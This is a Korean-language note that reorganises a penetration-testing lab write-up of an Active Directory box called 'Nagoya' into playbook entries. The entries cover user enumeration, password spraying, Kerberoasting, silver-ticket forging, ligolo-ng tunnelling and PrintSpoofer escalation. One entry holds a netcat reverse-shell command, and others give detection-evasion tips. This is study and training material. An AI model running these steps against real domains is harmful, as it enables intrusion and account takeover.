# Nagoya → _PLAYBOOK 이관 제안

노트 967→N행 개작 중 추출. 원문은 `03. PG\_backup\Nagoya.md.bak2`(옛 골격 전문 보존) 대조 가능.
표기: **[병합]** 기존 절 번호 명시 / **[신규]** 번호 비움, 상위 카테고리만 제시.

---

## 1. [병합] A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다

기존 항목의 「`KRB5CCNAME`」 불릿에 아래 사례 추가.

**추가할 본문:**
> [[Nagoya]] — `export KRB5CCNAME=$PWD/Administrator.ccache\`(줄 끝 백슬래시로 다음 줄과 연속)가 `~/.zsh_history` 에 **두 번** 남았고, 그 사이에 `impacket-mssqlclient nagoya.nagoya-industries.com -k` 가 섞여 있다. export 가 줄 연속으로 먹혀 환경변수가 제대로 안 잡힌 상태에서 `-k` 를 쳤을 가능성이 큼. zsh 히스토리는 세션 종료 시 기록되고 `hist_ignore_dups` 로 중복이 접히므로 **정확한 순서는 단정하지 않음** — 남은 건 "이 줄을 두 번 다시 쳤다"는 사실뿐. → `-k` 를 치기 전 **항상 `klist` 로 확인할 것**. ccache 가 비면 impacket 은 조용히 다른 인증으로 넘어가거나 애매한 에러를 냄.

**지우기 전 원문(Nagoya.md 원본 6장 항목 7):**
> **7. ccache 없이 `-k` 를 먼저 쳐본 흔적**
> 히스토리에 `export KRB5CCNAME=$PWD/Administrator.ccache\`(줄 끝 백슬래시)가 두 번, 그 사이에 `impacket-mssqlclient nagoya.nagoya-industries.com -k` 가 섞여 있다. export 가 줄 연속으로 먹혀 환경변수가 제대로 안 잡힌 상태에서 `-k` 를 쳤을 가능성이 크다.
> ※ zsh 히스토리는 세션 종료 시 기록되고 `hist_ignore_dups` 로 중복이 접히므로 **정확한 순서를 단정하지는 않는다.** 남은 건 "이 줄을 두 번 다시 쳤다"는 사실뿐이다.
> → 교훈: `-k` 를 치기 전에 **항상 `klist` 로 확인**한다. ccache 가 비면 impacket 은 조용히 다른 인증으로 넘어가거나 애매한 에러를 낸다.

---

## 2. [병합] B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다

**추가할 본문:**
> [[Nagoya]] — craig.carr(EMPLOYEES) 하나로 시작해 **2홉** 사슬(EMPLOYEES→GenericAll→iain.white(HELPDESK)→GenericAll→christopher.lewis(DEVELOPERS, Remote Management Users 유일 멤버))을 사람이 아니라 BloodHound 수집 JSON 으로 확정. HELPDESK 의 GenericAll 대상 21명이 EMPLOYEES 멤버 21명과 **정확히 같은 집합**이라는 것도 ACE 개수를 세어야 나오는 값이라 육안 열거로는 못 봄.

**지우기 전 원문(원본 2-3절):**
> `craig.carr` 를 잡고 BloodHound 를 돌렸을 때 나온 그림이 이 박스의 실체다.
> [표: 홉1 craig.carr∈EMPLOYEES GenericAll→iain.white / 홉2 iain.white∈HELPDESK GenericAll→christopher.lewis / 홉3 christopher.lewis∈DEVELOPERS → WinRM]
> HELPDESK 의 GenericAll 대상 21명은 EMPLOYEES 의 멤버 21명과 **정확히 같은 집합**이다(154341 스크린샷의 부채꼴, `20260706153247_users.json` ACE 카운트로도 21). 즉 "HELPDESK 가 일반 직원 전원을 관리한다"는 위임을 그대로 옮긴 설정.
> **왜 2홉이 필요한가.** craig.carr 는 EMPLOYEES 소속이라 iain.white 는 건드릴 수 있지만 christopher.lewis 는 못 건드림. christopher.lewis 를 통제하는 건 HELPDESK 인데 craig.carr 는 HELPDESK 가 아님. 그런데 iain.white 가 HELPDESK 멤버라 경유지로 씀.
> **왜 굳이 christopher.lewis 인가.** Remote Management Users 의 멤버가 DEVELOPERS 그룹 하나이고, EMPLOYEES/HELPDESK 가 손댈 수 있는 계정 중 DEVELOPERS 소속은 christopher.lewis 뿐(나머지 DEVELOPERS 멤버 joanne.lewis·damien.chapman·megan.johnson·elaine.brady 는 ACCOUNT OPERATORS 만 통제). **셸이 되는 계정은 하나였다.**

---

## 3. [병합] B-71. 내부에만 열린 서비스는 SSH `-L` 로 끌어온다

**추가할 본문:**
> **SSH 발판이 없는 AD 박스(WinRM 만 있음)에서는 ligolo-ng 가 같은 역할을 한다.** [[Nagoya]] — nmap `-p-` 결과가 `Not shown: 65514 filtered`(closed 아님)였고, WinRM 셸 획득 후 `nxc-sweep <IP> -u <user> -p <pass>` 로 **자격증명이 유효한 서비스를 한 번에 스윕**했더니 `[-] Port 1433 closed/filtered. Skipping mssql` 이 바로 나와 "MSSQL 은 살아있는데 외부에서만 안 보인다"를 즉시 알았다. evil-winrm 의 `upload` 로 에이전트 바이너리를 올리고 `.\agent.exe -connect <Kali>:11601 -ignore-cert` 로 콘솔에 접속시킨 뒤 `session` → `start` 로 터널을 열면 `240.0.0.1`(ligolo 관례상 "에이전트의 127.0.0.1")로 내부 전용 포트에 닿는다. **`start` 를 안 치면 터널이 안 열리는 게 흔한 실수.** Kerberos 인증이 필요한 서비스(MSSQL 등)로 그 터널을 쓰려면 `/etc/hosts` 에 `240.0.0.1 <FQDN>` 을 등록해야 함 — SPN 은 IP 가 아니라 호스트명이라(A-51 과 같은 요점).
> → **자격증명을 얻으면 로그인을 하나씩 찔러보기 전에 서비스 스윕부터.** "어디에 붙을 수 있는가"를 목록으로 먼저 본다.

**지우기 전 원문(원본 3-3절 + 6장 항목 8, 요지만):**
> `[-] Port 1433 closed/filtered` — 자격증명은 맞는데 서비스에 닿을 수가 없다. nmap 의 `65514 filtered` 가 여기서 의미를 갖는다. … 해법은 christopher.lewis 셸을 발판 삼아 타겟 내부로 터널을 놓는 것. ligolo-ng 를 썼다. (인터페이스 UP → 라우트 추가 → 프록시 기동 → 에이전트 업로드·실행 → session/start → /etc/hosts 등록, 전체 명령 시퀀스는 원본 3-3절)
> **8. 1433 이 안 보인 것을 알아챈 시점** — nxc-sweep 이 `[-] Port 1433 closed/filtered. Skipping mssql` 을 뱉어줘서 바로 알았다. 만약 impacket-mssqlclient 를 그냥 쳤다면 타임아웃을 기다리며 헤맸을 것. → 교훈: 자격증명을 얻으면 서비스별로 한 번에 훑는 스윕을 먼저 돌린다.

---

## 4. [신규] A-1 정찰·열거

**제목(안):** ASP.NET Core/MVC 사이트에 확장자 사전을 늘려도 소용없다 — 라우팅이지 파일이 아니다

**넣을 본문:**
> **증상** — feroxbuster 를 확장자 조합을 바꿔가며 여러 번 돌리는데 새 경로가 안 나온다.
> [[Nagoya]] 실측 — `php,html,txt,bak,zip` → `html,txt,php` → `html,txt,asp,aspx` 순으로 **3회**(13:25/13:32/13:35, 약 10분) 돌렸으나 state 파일을 열어보면 **세 번 모두 200 응답은 똑같은 12개**. 세 번째만 응답 총계 913 중 **901 이 503** — 새 경로가 아니라 `.asp/.aspx` 를 퍼붓다 IIS 가 뻗은 것. 세 state 전부 scan status 가 `Running` 이라 **완주한 실행은 하나도 없음**(전부 손으로 끊음).
> **판정 근거** — `/Nagoya.styles.css`(ASP.NET Core CSS isolation 산출물, `<어셈블리명>.styles.css`)와 `/index`·`/team`·`/error` 가 확장자 없이 200 인 것(MVC 라우팅) 두 근거가 같은 결론을 가리킴.
> → **ASP.NET Core/MVC 는 파일이 아니라 라우트로 동작.** 확장자 사전을 늘리는 시도는 의미가 없고, 정적 자산 외 페이지는 첫 스캔에서 이미 다 나온다. `/team` 을 처음 봤을 때 멈췄어야 함.

**지우기 전 원문(원본 1장 웹 절 경고 콜아웃 + 6장 항목 1):**
> [!warning] 여기서 스캐너를 계속 돌리면 시간을 태운다
> ferox 를 세 번 돌렸다(6장). 세 번째에 `-x html,txt,asp,aspx` 로 913개 응답을 받았지만 그중 901개가 503이고 200 은 세 번 모두 같은 12개였다.
> ASP.NET Core 는 **파일이 아니라 라우트**로 동작한다. 확장자 사전에 aspx 를 더하는 게 도움이 안 되는 이유다.
>
> **1. feroxbuster 3회 (13:25 / 13:32 / 13:35, 약 10분)**
> 확장자 조합을 바꿔가며 세 번 돌렸다(`php,html,txt,bak,zip` → `html,txt,php` → `html,txt,asp,aspx`). state 파일을 열어보면 **세 번 모두 200 응답은 똑같은 12개**다. 세 번째만 응답 총계가 913인데 그중 901이 **503**이다 — 새 경로를 찾은 게 아니라 `.asp/.aspx` 를 퍼붓다 IIS 가 뻗은 것이다. 그리고 세 state 전부 scan status 가 `Running` 이라 **완주한 실행은 하나도 없다.** 셋 다 손으로 끊었다.
> → 교훈: **ASP.NET Core/MVC 사이트에 확장자 사전을 늘리는 건 의미가 없다.** 라우팅이지 파일이 아니다. `/team` 을 첫 스캔에서 이미 봤으니 거기서 멈췄어야 했다.

---

## 5. [신규] B-5 Active Directory (또는 B-6 자격증명 — 총괄 배정)

**제목(안):** 웹 정찰이 곧 스프레이 재료다 — 실명은 계정명, 저작권 연도는 비밀번호 후보

**넣을 본문:**
> **1) 실명 → 계정명 → 존재 확인 3단 콤보.** `/team`·`/about`·`/staff`·`/contact` 등에서 실명을 걷고(`curl … | grep -oP '(?<=<td>)[A-Za-z]+' | paste - -`), username-anarchy 로 규칙 전개(이름당 14~15종), kerbrute userenum 으로 KDC AS-REQ 사전인증 에러 코드 차이(`KDC_ERR_C_PRINCIPAL_UNKNOWN` vs `KDC_ERR_PREAUTH_REQUIRED`)로 실재 계정만 골라낸다. **kerbrute 는 비밀번호를 보내지 않아 계정 잠금을 유발하지 않는다** — 스프레이 전에 목록을 줄이는 유일하게 안전한 수단.
> [[Nagoya]] 실측 — 28명 실명 → 405개 후보 → 26개 확정(전부 `이름.성` 형식, kerbrute 139초).
> **2) 비밀번호 후보는 사이트에서 읽는다.** 저작권 연도·창립 연도·지역명·제품명. 계절+연도(`Spring2023` 등)는 90일 주기 조직에서 실제로 흔함. [[Nagoya]] — 푸터 `© 2023` 하나로 후보를 4개(`Spring/Summer/Fall/Winter2023`)로 좁혀 26계정×4회=104회, **계정당 4회**로 잠금 임계값(보통 5~10) 아래에 둠. craig.carr:Spring2023, fiona.clark:Summer2023 확보.
> **3) 스프레이는 `--continue-on-success`.** 첫 성공에서 멈추면 더 나은 권한의 두 번째 계정을 놓친다. [[Nagoya]] — 이 옵션이 없었으면 `fiona.clark:Summer2023` 을 놓쳤을 것(결과적으로 craig.carr 만 썼지만).
> **4) 자격증명 0개 상태의 우선순위** — AS-REP 로스팅(`impacket-GetNPUsers -no-pass`)은 **공짜**라 항상 먼저 때려본다(전멸해도 5분 손해뿐). 널 세션(`smbclient -L -N`)은 **한 번만** 확인하고 넘어간다 — Server 2019 DC 는 기본적으로 익명 열거를 막는다.

**지우기 전 원문(원본 0장 항목 1·2, 2-1·2-2절, 3-1절, 6장 항목 3·4, 7장 항목 1~4):**
> (0장) 1. 웹 페이지의 사람 이름이 곧 계정 목록이다. 실명 → 계정명 규칙 생성 → Kerberos 사전인증으로 존재 여부 확인, 이 3단 콤보.
> 2. 비밀번호 정책을 사이트에서 읽는다. 푸터의 `© 2023` 하나로 스프레이 후보가 4개로 줄었다.
> (2-1/2-2절 전문 — username-anarchy·kerbrute 명령/출력, AS-REP 실패 로그, season_pass.txt, 계정당 횟수 계산 — Nagoya.md.bak2 원문 참조)
> (3-1절) nxc smb 스프레이 명령·출력, `--continue-on-success` 설명
> (6장) 3. 자격증명 없는 상태에서 무의미한 시도들(nxc null/plaintext, smbclient anonymous) → 널 세션은 한 번만.
> 4. AS-REP 로스팅 전멸 — 이건 낭비가 아니다, 공짜 해시 경로라 항상 먼저 때려본다.
> (7장) 1~4번 항목 — 웹 실명=계정목록, kerbrute 잠금없음, 비밀번호 후보 사이트에서, `--continue-on-success`.

---

## 6. [신규] B-6 자격증명·크래킹 (또는 B-5 AD — 총괄 배정)

**제목(안):** Kerberoast 로 깬 비밀번호가 로그인이 안 되면 실버/골든 티켓 재료로 써라

**넣을 본문:**
> **SPN 계정 비밀번호를 깼는데 어떤 대화형 서비스(WinRM/RDP/SSH)에도 로그인이 안 되면, 그건 실패가 아니라 서비스 계정의 정상 상태다.** 그 값을 로그인 수단이 아니라 **Kerberos 티켓 위조 재료**로 전환할 것.
>
> **재료 넷과 조달처:**
> | 재료 | 조달 |
> |---|---|
> | 서비스 계정 NT해시 | 평문을 `hashlib.new("md4", pw.encode("utf-16le")).hexdigest()` — 솔트·반복 없음. secretsdump 로 직접 얻었으면 그 값 그대로 |
> | 도메인 SID | `impacket-lookupsid <domain>/<any_user>:<pw>@<dc>` 또는 인증된 세션에서 `[System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value` |
> | SPN | `impacket-GetUserSPNs` 출력의 `ServicePrincipalName` |
> | 사칭할 RID | `500`(Administrator) 고정 |
>
> `impacket-ticketer -nthash <NT> -domain-sid <SID> -domain <realm> -spn <SPN> -user-id 500 Administrator` → `.ccache` 생성. `-spn` 있으면 **실버**(그 서비스 전용), 없고 krbtgt 해시면 **골든**(도메인 전체).
>
> **etype 이 크랙 가능성과 hashcat 모드를 정한다** — `$krb5tgs$23$`(RC4-HMAC) 는 NT해시 그대로 암호화라 `-m 13100` 로 rockyou 몇 초. etype 18(AES256) 이면 `-m 19700` 로 훨씬 느림.
>
> **탐지 아티팩트 — ticketer 기본 유효기간 10년**(`-duration` 기본 87600시간). 진짜 KDC 발급 서비스 티켓은 기본 10시간이라 이 한 줄만 봐도 위조가 드러남. 조용히 가려면 `-duration` 을 줄일 것.
>
> **PAC 서명 강제(KB5020805/CVE-2022-37967, `KrbtgtFullPacSignature`)가 걸린 DC 에서는 실버티켓이 막힌다** — 서명이 krbtgt 키로 만들어져 서비스 계정 해시만으로는 위조 불가. 2023-07 부터 enforcement 기본값. `PacRequestorEnforcement`(KB5008380)와 다른 것 — 그건 KDC 가 **발급한** 티켓만 검사해 KDC 를 안 거치는 실버티켓엔 안 걸림.
>
> **주의 — SQL 세션 프롬프트(예: `Administrator dbo@master`)와 `xp_cmdshell` 실행 컨텍스트는 다르다.** 프록시 계정 미설정 시 xp_cmdshell 은 **SQL Server 서비스 계정**으로 프로세스를 띄운다. "SQL 안에서의 sysadmin" 이지 "OS 관리자"가 아니므로 SeImpersonate 등 다음 권한상승 단계가 필요할 수 있다.

**지우기 전 원문(원본 2-4절 전문 · 4-1~4-4절 전문 · 6장 항목 5 · 7장 항목 6·7):**
> (2-4절) Kerberoast → 실버티켓 이론 전문 — `$krb5tgs$23$` etype 설명, hashcat 결과(`svc_mssql:Service1`, 9초), 실버티켓 성립 원리 note 콜아웃(PAC/서비스 키/제약 2가지), 재료 4종 표.
> (4-1~4-4절) 도메인 SID 확보(WindowsIdentity + impacket-lookupsid 이중 확인), NT해시 계산(md4/utf-16le), ticketer 실행 전문과 플래그별 설명(`-spn`/`-domain-sid`/`-user-id 500`/`-domain`, 기본 groups 518/519/512/513/520, [가정] BUILTIN\Administrators 자동 sysadmin 아님/SQL2008 이후 근거), klist 확인, KRB5CCNAME 절대경로 필요성, mssqlclient -k 접속(FQDN 필수 이유), xp_cmdshell 활성화, 실행 컨텍스트가 svc_mssql 로 떨어지는 이유.
> (6장) 5. svc_mssql 로 로그인 시도 실패 3건(evil-winrm/xfreerdp 기록없음/ssh -L 흔적만) → "비밀번호를 깼다"와 "로그인할 수 있다"는 다른 문제.
> (7장) 6~7. Kerberoast 는 자격증명 하나면 됨(etype23→hashcat 13100) / 로그인 안 되면 티켓 재료로.

---

## 7. [신규] A-5 Active Directory (또는 A-4 권한상승)

**제목(안):** 자격증명은 맞는데 어떤 대화형 서비스도 로그인을 안 받아준다

**넣을 본문:**
> **증상** — nxc/nxc-sweep 등에서 자격증명 자체는 `[+]`(SMB 등)로 확인됐는데 WinRM/RDP 로그인은 전부 `[-]`.
> [[Nagoya]] 실측 — svc_mssql:Service1 을 깬 직후 `evil-winrm -u SVC_MSSQL -p Service1` 실패(nxc 도 `WINRM [-]`, Remote Management Users 미소속), `xfreerdp` 도 실패(nxc 는 `RDP [+]` 로 자격증명 자체는 유효하다고 판정 — **실패 원인이 대화형 로그온 권한 거부인지 다른 것인지는 원본 노트에도 xfreerdp 출력이 안 남아 기록에 없다**), `ssh -L 13389:...` 로 RDP 를 로컬로 당겨오려던 흔적 후 접음.
> → **서비스 계정은 대화형/원격 로그온이 막혀 있는 게 정상.** "비밀번호를 깼다"와 "로그인할 수 있다"는 다른 문제 — 로그인이 막히면 그 계정을 로그인 수단이 아니라 **암호 재료**로 재해석할 것(B-6 실버/골든티켓 카드로 전환).
> A-24(한 서비스의 거부는 자격증명의 오류가 아니다)와의 차이 — A-24 는 "다른 서비스에 돌려보면 통한다"는 사례고, 이건 **어떤 대화형 서비스에도 안 통하는 것이 정상인 계정 부류**(AD 서비스 계정)를 다루는 항목.

**지우기 전 원문(원본 6장 항목 5 전문):**
> **5. svc_mssql 로 로그인 시도 (15:56 이후)**
> 비밀번호를 깼으니 당연히 로그인부터 시도했다.
> - `evil-winrm -i … -u 'SVC_MSSQL' -p 'Service1'` → 실패. nxc 도 `WINRM [-]` 였다. Remote Management Users 소속이 아니다.
> - `xfreerdp /u:svc_mssql /p:'Service1' /v:192.168.120.21 /dynamic-resolution +clipboard /drive:kali,/home/kali` → 원본 노트는 "로그인 불가"라고만 적혀 있고 xfreerdp 출력은 어디에도 남아 있지 않다. nxc 는 `RDP [+]` 로 자격증명 자체는 유효하다고 판정했으므로, 실패 원인(대화형 로그온 권한 거부인지 다른 것인지)은 기록에 없다.
> - `ssh -L 13389:192.168.120.21:3389 kali@192.168.164.130` — RDP 를 로컬로 당겨오려 한 흔적. 이후 기록이 없어 여기서 접었다.
> → 교훈: "비밀번호를 깼다"와 "로그인할 수 있다"는 다른 문제다. 서비스 계정은 대화형/원격 로그온이 막혀 있는 게 정상이다. 그때는 그 계정을 로그인 수단이 아니라 암호 재료로 볼 줄 알아야 한다(→ 실버티켓).

---

## 8. [신규] A-5 Active Directory (DC 컴퓨터 계정 whoami 결과 판정)

**제목(안):** DC 에서 `whoami` 가 SYSTEM 이 아니라 `DOMAIN\HOST$` 로 나온다 — 실패가 아니다

**넣을 본문:**
> **증상** — 권한상승 페이로드 실행 후 리버스셸에서 `whoami` 가 `nt authority\system` 이 아니라 `<도메인>\<호스트명>$`(컴퓨터 계정)로 나와 실패로 오인.
> [[Nagoya]] 실측 — PrintSpoofer 로 사칭된 세션이 `nagoya-ind\nagoya$` 로 떨어졌다. BloodHound 도메인 객체 ACE 를 보면 `Domain Controllers` 그룹이 `GetChangesAll` 을, `Enterprise Domain Controllers`(S-1-5-9)가 `GetChanges` 를 가짐. **DCSync 는 이 둘이 모두 있어야 성립**하는데 DC 머신 계정은 양쪽에 다 들어가므로 결과적으로 도메인 관리자와 실질적으로 동등. 실제로 Administrator 데스크톱을 그대로 읽었다.
> `[가정]` 왜 SYSTEM 표기가 아니라 머신 계정으로 떨어졌는지는 원본 노트에 확인 기록이 없다 — 사칭된 토큰이 로컬 SYSTEM 이 아니라 네트워크 컨텍스트의 머신 계정이었을 가능성.
> → **DC 에서 `whoami` 결과가 `DOMAIN\HOST$` 면 그 자체로 성공 신호일 수 있다.** SYSTEM 이 안 나왔다고 실패로 판단하지 말 것.

**지우기 전 원문(원본 4-5절 경고 콜아웃 전문 + 7장 항목 10):**
> [!warning] `nt authority\system` 이 아니라 `nagoya-ind\nagoya$` 가 나왔다
> 출처: `파일보관/Pasted image 20260707105454.png`. 화면에 그렇게 찍혀 있다.
> `nagoya$` 는 이 DC 의 컴퓨터 계정이다. BloodHound 수집분(`20260706153247_domains.json`)의 도메인 객체 ACE 를 보면 `Domain Controllers` 가 `GetChangesAll` 을, `Enterprise Domain Controllers`(S-1-5-9)가 `GetChanges` 를 갖는다. DCSync 는 둘 다 있어야 성립하는데 DC 머신 계정은 양쪽에 다 들어가므로 결과적으로 된다 — `GetChangesAll` 하나가 곧 DCSync 인 것은 아니다. 어느 쪽이든 도메인 관리자와 실질적으로 동등한 자리고, 실제로 Administrator 의 데스크톱을 그대로 읽었다.
> 왜 SYSTEM 표기가 아니라 머신 계정으로 떨어졌는지는 기록이 없다. [가정] 사칭된 토큰이 로컬 SYSTEM 이 아니라 네트워크 컨텍스트의 머신 계정이었을 가능성이 있으나, 이 박스에서 확인하지 않았다.
> 결과적으로는 상관없었지만, whoami 가 SYSTEM 이 아니라고 실패로 판단하지 마라. DC 에서는 머신 계정이 그 이상이다.
> (7장 항목10) DC 에서 whoami 가 DOMAIN\HOST$ 로 나오면 성공한 것이다. …

---

## 9. [신규] B-4 Windows 권한상승

**제목(안):** SeImpersonatePrivilege Enabled + Spooler 생존 → PrintSpoofer

**넣을 본문:**
> **셸을 잡으면(특히 서비스 계정) `whoami /priv` 부터.** `SeImpersonatePrivilege : Enabled` 는 서비스 계정에 거의 항상 붙어 있고 곧바로 Potato 계열(PrintSpoofer/GodPotato/JuicyPotatoNG)이 통한다는 신호.
> [[Nagoya]] 실측 — `xp_cmdshell whoami /priv` 로 `svc_mssql` 컨텍스트에서 `SeImpersonatePrivilege Enabled` 확인. PrintSpoofer64.exe·nc64.exe 를 `C:\programdata\`(모든 계정 쓰기 가능, 감시 느슨)에 `iwr` 로 업로드 — **`iwr` 은 성공 시 아무것도 안 뱉는다.** PowerShell 출력 `NULL` 이 성공, 예외 텍스트가 나오면 실패.
> 실행 로그 3줄이 각 단계: `[+] Found privilege: SeImpersonatePrivilege` → `[+] Named pipe listening...` → `[+] CreateProcessAsUser() OK` — 권한 확인 → 명명 파이프 대기 → 스풀러가 그 파이프에 붙어와 사칭돼 새 프로세스 생성.
> ```
> xp_cmdshell C:\programdata\ps.exe -c "C:\programdata\nc64.exe <LHOST> <PORT> -e cmd.exe"
> ```
> **방어** — DC 에서 Print Spooler 를 끈다. PrintSpoofer 와 PrinterBug 를 동시에 막음.

**지우기 전 원문(원본 4-5절 코드/설명, `[!warning]` 콜아웃 제외):**
> (whoami /priv 출력 표 전문 — SeImpersonatePrivilege Enabled 외 5개 특권)
> **`SeImpersonatePrivilege : Enabled`** — 서비스 계정에 거의 항상 붙어 있는 권한이고, 곧바로 Potato 계열이 통한다는 뜻이다. 셸을 잡으면 `whoami /priv` 부터 치는 이유가 이것.
> 바이너리 두 개를 올린다(칼리에서 `python3 -m http.server 80`). (iwr 업로드 명령 2개)
> **출력이 `NULL` 인 게 성공이다.** `iwr` 은 성공 시 아무것도 안 뱉는다 — 실패했으면 예외 텍스트가 나온다. `C:\programdata` 는 모든 계정이 쓸 수 있고 대개 감시가 느슨해서 스테이징 경로로 쓴다.
> 리스너를 띄우고 발사한다. (rlwrap nc -lnvp 9001, xp_cmdshell ps.exe 실행)
> 세 줄이 각각 단계다 — 권한 확인 → 명명 파이프 대기 → 스풀러가 그 파이프에 붙어온 걸 사칭해서 새 프로세스 생성.

---

## 10. [신규] A-6 판단·검증 (메타) — 도구 경로 정비

**제목(안):** 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 경로·아키텍처 탐색 비용을 만든다

**넣을 본문:**
> [[Nagoya]] 실측 — `users.txt`(14:07) 와 kerbrute 성공(14:36) 사이 29분 중 상당수가 사소한 경로 문제였다: `./username-anarchy -i /home/PG/Nagoya/names.txt`(`/home/kali` 누락 오타) → 재실행, 생성된 `users.txt` 가 도구 디렉터리에 떨어져 `mv` 로 이동, `kerbrute userenum`(PATH 에 없음) → `kerbrute_linux_386`(아키텍처 틀림) → `kerbrute_linux_amd64`(성공, 세 번째), 그 사이 `kerbrute … usernames.txt` 로 없는 파일명을 준 시도도 있었다.
> → **환경 정비로 0 이 되는 비용.** 실제로 이 박스 도중 `export PATH="$HOME/git/username-anarchy:$PATH"` 를 `.zshrc` 에 추가해 해결했다 — 시험 전에 자주 쓰는 도구들의 PATH 를 미리 잡아둘 것.

**지우기 전 원문(원본 6장 항목 2 전문):**
> **2. username-anarchy 경로·kerbrute 바이너리 헤매기 (약 25분)**
> `users.txt`(14:07) 와 kerbrute 성공(14:36) 사이에 29분이 비는데, 히스토리를 보면 전부 사소한 것들이다:
> - `./username-anarchy -i /home/PG/Nagoya/names.txt` — 경로 오타(`/home/kali` 누락). 다시 실행.
> - 생성된 `users.txt` 가 도구 디렉터리에 떨어져서 `mv users.txt ~/PG/Nagoya`.
> - `kerbrute userenum …` → PATH 에 없음. → `kerbrute_linux_386` (아키텍처 틀림) → `kerbrute_linux_amd64` 로 세 번째에 성공.
> - 그 사이 `kerbrute … usernames.txt` 로 **없는 파일명**을 준 시도도 있다.
> → 교훈: 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 이 비용을 만든다. PATH 에 넣어두면 끝난다(실제로 이 박스 도중에 `export PATH="$HOME/git/username-anarchy:$PATH"` 를 `.zshrc` 에 추가했다).

---

## 11. [신규] A-6 판단·검증 (메타) — zsh 히스토리 확장

**제목(안):** zsh 에서 `!` 가 든 비밀번호는 큰따옴표 안에서도 히스토리 확장된다

**넣을 본문:**
> [[Nagoya]] 실측 — `net rpc password "christopher.lewis" 'Password123!' -U "nagoya-industries.com/iain.white%Password123 -S 192.168.120.21\` 형태(큰따옴표 미종결 + 줄 끝 `\`)가 `~/.zsh_history` 에 **세 번** 반복, 그 앞에 인용부호는 맞았는데 줄 끝 `\` 만 붙은 실패가 한 번 더 있어 합쳐 **네 줄**. `evil-winrm … -p 'Password123\!'\` 처럼 `!` 를 백슬래시로 이스케이프하려던 시도도 실패.
> → **`!` 가 든 비밀번호는 무조건 작은따옴표.** 큰따옴표 안에서도 zsh 히스토리 확장이 일어난다. `-U 'DOMAIN/user%pass'` 는 통째로 한 덩어리라 따옴표를 중간에서 끊지 말 것.

**지우기 전 원문(원본 3-2절 danger 콜아웃 + 6장 항목 6 전문):**
> [!danger] 이 명령의 인용부호가 이 박스에서 제일 많이 시간을 잡아먹었다
> `Password123!` 의 `!` 는 zsh 에서 히스토리 확장이다. 큰따옴표 안에서도 확장되므로 반드시 작은따옴표로 감싼다.
> 실제로 `~/.zsh_history` 에 실패한 시도가 네 줄 남아 있다 — 그중 셋은 `-U "…%Password123` 의 큰따옴표를 닫지 않았고, 셋은 줄 끝에 `\` 가 붙어 셸이 다음 줄을 기다렸다(둘 다인 것이 둘). 자세한 건 6장.
> **6. `net rpc password` 인용부호 지옥 (히스토리에 4회 실패)**
> ```bash
> net rpc password "christopher.lewis" 'Password123!' -U "nagoya-industries.com/iain.white%Password123 -S 192.168.120.21\
> ```
> 큰따옴표를 닫지 않은 채 줄 끝에 `\` 가 붙어 셸이 계속 다음 줄을 기다렸다. 이 형태가 세 번 반복되고(그중 하나는 줄 끝 `\` 없이 같은 미종결 인용부호), 그 앞에 `iain.white` 를 대상으로 한 실패가 한 번 더 있다 — 인용부호는 맞았는데 줄 끝 `\` 만 붙은 경우다. 합쳐 네 줄. `evil-winrm … -p 'Password123\!'\` 처럼 `!` 를 백슬래시로 이스케이프하려다 실패한 것도 있다.
> → 교훈: zsh 에서 `!` 가 든 비밀번호는 무조건 작은따옴표. 큰따옴표 안에서도 히스토리 확장이 일어난다. 그리고 `-U 'DOMAIN/user%pass'` 는 통째로 한 덩어리라 따옴표를 중간에서 끊으면 안 된다.

---

## 12. [신규] D. 시간 배분 · 손절 기준 (또는 C-1) — Nagoya 시간표 참고자료

**제목(안):** AD 다단계 체인의 시간표 예시(정찰 → 셸 → 하룻밤 공백 → 권한상승)

**넣을 본문:**
> [[Nagoya]] 시간표(전부 KST, 등급: 실측=mtime/도구 타임스탬프, 상한=스크린샷 붙여넣기 시각, 역산/추정=계산값) —
> nmap `-p-`(07-06 13:08–13:10, 131초) → ferox 3회(13:25/32/35) → whatweb(13:32) → names.txt(13:52) → users.txt 405개(14:07) → kerbrute 26개 확정(14:36:30–14:38:49, 139초) → valid_users.txt(14:45) → season_pass.txt(14:55) → 스프레이 성공 craig.carr(~15:00, 추정) → BloodHound(15:32) → Kerberoast→hashcat(15:55→15:56:13, 9초) → agent.exe 준비(16:55) → **약 17시간30분 공백(하룻밤 중단)** → 07-07 ligolo 기동(~10:27:51)~에이전트 접속(10:30:42, 로그 실측)~터널 start(~10:31:02) → ccache 생성(10:39:08) → mssqlclient 접속(≤10:40:41, 상한) → xp_cmdshell(≤10:42:09, 상한) → PrintSpoofer 리버스셸(≤10:52:40, 상한 — 노트에 안 쓴 스크린샷 `…105240.png` 에 이미 연결돼 있어 실제 성공은 이보다 이름) → proof.txt(≤10:56:21, 상한).
> **실작업 약 4시간15분**(07-06 3시간47분 + 07-07 28분). 공백은 하룻밤 중단.
> **손절 지점 사례** — Kerberoast 로 깬 계정이 어디에도 로그인이 안 되는 걸 확인한 직후(15:56), "그럼 이 해시를 뭐에 쓰지"로 전환. 로그인 시도를 30분 이상 붙들지 않은 것이 시간을 아꼈다.
> **스크린샷 파일명 vs mtime 괴리 사례** — 타겟 로그 타임스탬프(`2026-07-06T18:30:42-07:00`, UTC-7)를 KST 환산하면 07-07 10:30:42 인데, 관련 스크린샷 파일명은 `20260707103620`(6분 뒤 붙여넣기). **파일명 시각은 촬영이 아니라 볼트에 붙여넣은 시각** — 사건의 상한으로만 쓸 것.

**지우기 전 원문:** 원본 6장 전체(시간표 표 + "실제로 시간을 태운 것들" 1·8번, 2·3·4·5·6·7 은 위 1~11 로 이미 이관) + 7장 "시간 배분" 절 전문. 전문은 `Nagoya.md.bak2` 6장·7장 참조.

---

## 검산

- 옛 0장(5개 항목) → 5,6,7,9 로 분산 이관 (전량)
- 옛 6장(시행착오 1~8) → 1,2,3,4,5(3·4항목),7,10,11,12 로 전량 이관 (8건 → 이관 완료)
- 옛 7장(시험 관점 1~10 + 수동대안 + 시간배분) → 5,6,8,9,12 + 노트 잔류(Steps to reproduce 요약)로 이관. **수동 대안 표는 finding 프로즈에 흡수**(username-anarchy 손규칙·GetNPUsers·ldapsearch·chisel/ssh -L·GodPotato 대안 — 각 4항목 재현 산문에 병기)
- 옛 8장(방어) → 각 finding `Vulnerability Fix:` 로 이관 (노트 본문에 반영 완료, 별도 playbook 불필요)
